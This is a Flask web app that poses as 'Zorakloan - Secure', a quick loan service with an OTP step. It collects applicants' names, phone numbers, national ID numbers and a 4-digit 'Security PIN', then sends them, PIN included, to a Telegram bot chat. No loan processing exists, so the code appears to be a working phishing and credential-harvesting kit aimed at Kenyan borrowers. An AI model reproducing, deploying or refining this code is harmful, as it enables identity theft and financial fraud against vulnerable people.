import os, random
from flask import Flask, request, render_template_string, session
import requests
app = Flask(__name__)
app.secret_key = "zorak-2024-key"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

loans_db = {}

FORM_HTML = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Zorakloan</title>
<style>
body{font-family:Arial;background:#f5f7fa;padding:15px}
.box{background:white;max-width:450px;margin:auto;padding:25px;border-radius:15px;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
h2{text-align:center;color:#0a7a3e}
input,select{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold}
.pin-box{background:#fff8e1;padding:12px;border-radius:8px;border:1px dashed #ffb300;margin:8px 0}
small{color:gray}
</style></head>
<body><div class="box">
<h2>Zorakloan - Secure</h2><p style="text-align:center"><small>Quick approval - OTP + PIN</small></p>
<form method="POST">
<input name="full_name" placeholder="Full Name" required>
<input name="phone" placeholder="Phone 07..." required>
<input name="id_number" placeholder="ID Number" required>
<input name="county" placeholder="County e.g Kitale" required>
<input name="amount" type="number" placeholder="Loan Amount Ksh" required>
<select name="period" required><option value="">Duration</option><option>1 Week</option><option>2 Weeks</option><option>1 Month</option></select>
<select name="employment" required><option value="">Employment</option><option>Employed</option><option>Business</option><option>Farmer</option></select>
<select name="purpose" required><option value="">Purpose</option><option>Business</option><option>Emergency</option><option>School Fees</option></select>
<div class="pin-box"><b>🔐 Security PIN (4-digit)</b><input name="pin" type="password" maxlength="4" placeholder="e.g 1234" required></div>
<button>Send OTP & Apply</button>
</form></div></body></html>
"""
OTP_HTML = """<div style="max-width:400px;margin:80px auto;padding:25px;background:white;border-radius:15px;font-family:Arial;text-align:center">
<h2>📱 Verify OTP</h2><p>Code for <b>{{PHONE}}</b><br><small style="color:green">TEST OTP: <b>{{OTP}}</b> (also sent to Telegram)</small></p>
<form method="POST" action="/verify-otp"><input name="otp" maxlength="6" placeholder="6-digit OTP" required style="width:100%;padding:14px;font-size:22px;text-align:center;letter-spacing:6px">
<button style="width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:10px">Verify</button></form></div>"""

@app.route('/')
def home(): return "Live - go to /api or /apply"
@app.route('/api', methods=['GET','POST'])
@app.route('/apply', methods=['GET','POST'])
def apply_route():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = f"ZRK-{random.randint(1000,9999)}"
        pending = {k: request.form.get(k) for k in ['full_name','phone','id_number','county','amount','period','employment','purpose','pin']}
        pending['ref']=ref
        session['pending']=pending; session['otp']=otp
        print(f"OTP {otp} for {pending['phone']}")
        try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID, "text": f"OTP {otp} for {pending['phone']} Ref {ref}"})
        except: pass
        return render_template_string(OTP_HTML.replace("{{PHONE}}",pending['phone']).replace("{{OTP}}",otp))
    return render_template_string(FORM_HTML)

@app.route('/verify-otp', methods=['POST'])
def verify():
    if request.form.get('otp')==session.get('otp') and session.get('pending'):
        loan=session.get('pending'); loans_db[loan['phone']]=loan
        msg=f"✅ VERIFIED {loan['ref']}\n👤 {loan['full_name']}\n📞 {loan['phone']} VERIFIED\n💰 {loan['amount']}\n🔐 PIN {loan['pin']}"
        try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID,"text":msg})
        except: pass
        session.clear(); return f"<h2 style='text-align:center'>✅ Verified! Ref {loan['ref']}</h2>"
    return "<h2 style='color:red;text-align:center'>❌ Wrong OTP <a href='/api'>Retry</a></h2>"

if __name__=='__main__': app.run(host='0.0.0.0', port=10000)